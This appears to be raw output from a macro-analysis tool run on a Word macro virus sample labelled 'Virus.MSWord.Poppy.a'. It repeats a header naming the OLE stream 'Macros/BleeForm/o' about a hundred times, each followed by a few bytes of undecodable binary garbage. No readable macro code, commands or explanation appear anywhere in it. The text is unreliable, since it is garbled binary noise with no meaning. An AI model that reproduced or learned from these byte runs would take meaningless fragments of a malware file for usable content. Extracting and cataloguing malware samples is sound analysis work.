- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=t�)���+U^���M�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8����gۑ$K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�N�Ktk?n�.3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!y?(�W��8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��5����(zZ�x���9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c��U٘
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MK����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��v��"Q59��B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y��0s���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
䬎4�	)Qٿ+��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�z!QS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z��� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X�+��]OTZ0v���o_�ԁ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W&����z�v�Xe�rq�eܧ�L� �ߨ�W;G�G���������5qW��ys�:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8ψ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������]M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�* �d�j�M�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�J�;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�M��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�H��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	3����`r}����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���C�]��!R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~&2�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'�'��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�6N��9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���r�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9�}�:׉�4a�:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ƣt��mU8�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SK��(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~�(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������뤮D�T�-�@!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j0ɳ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OV��8S��#[���I_����ZT%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`���8�gѸ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;����K֯��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%P����
Ȟr��\�>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U�X�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;z���q�Ca�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�=Lav��.�h�v�3����z�m���B�Z�*`.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q_b�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F�� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���t�%�:ˢ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�U�!���>w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$��FP�M�pɍB��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\q���-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O=yl�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���*��Yx��K�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��.>�0��n����m��4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�pA_��钾X�km
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b�ӝIkŇ���x�Ѝ����(n"!/�����$M�$N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P��#�}:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l{�c�^�f�ym�4�$��"p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)"e�,�8?0���'m�ֳx��-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��UE<r��Ӵ��i�bC30����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�rGө��k��N�I=��c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G̤����Ns�s�{d~fCC�D}?
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���*��?��nU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�؛��l���k{^��UOlq��W�U_�R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��fI�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ĕ:*{�;�mm]y��=�J���Gll*[i&��6�H�J��W\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`��5)Z`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�q�=wSL�Q옖E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N��ñ[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��?Ϛ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�׊p��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;al�Wg4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-���F���e-˼�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4��˳
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�eo�g�q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ur�&��Fa�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���I?��x��U�[M��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�eYp���r1�s�X��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���׷�����E�������@8�1�0V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tk���ת�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f���Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���<3��8:�[�>j�x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Q���p�������O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,ہ`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l�!ʂr����-5��Q�{�O�)-QGxU��
Aoxқ�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ոp���|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�<)_i5_�[=tw��!�ۤ���*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a�Q������I�B?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u"��I�C%^�k-D�8�i���@I>h��K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P���u7�d�,���.#}��,o
�9�=�e��Ӡ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%��Z�%ug���I�7m@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q՚�iX�i�jjdy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}��Iz
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sԟa�SF�fPI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=>�t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b^9��w'_yZ<���`�6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
oE���q���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 )?Q뎍SQ&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@l�t^�ߺ-'#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ǧV��B�ys��:���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N=Ƿ��F�E���<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>a������w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N�Ϯ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f��u��~���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t�I�Q����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n��U;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���EO{խW�ό�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�x�Ӻ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*v�S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d�q�U��g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���1����2�,��rI89�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�rG9>���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
mm?i/]���I%۸چZ�ޯ)E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ȑ�ٓۥ�go���a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�)j\L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[�M$c4T;�fݑ�rDk�$7![�R�0��xHs��>k�PeI�8˚�@4=ۧ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:�}��u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P��l�U,���Ē�F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��J�@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ĭQ^����Q�囒�%���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C�<��a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��7]7K�%4�z��)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:[h�a�R@����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l|�q��7^�ؤ��ujI��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v	]��_q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���%��e��8ju�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��oQr���e��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2v�BN��[���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
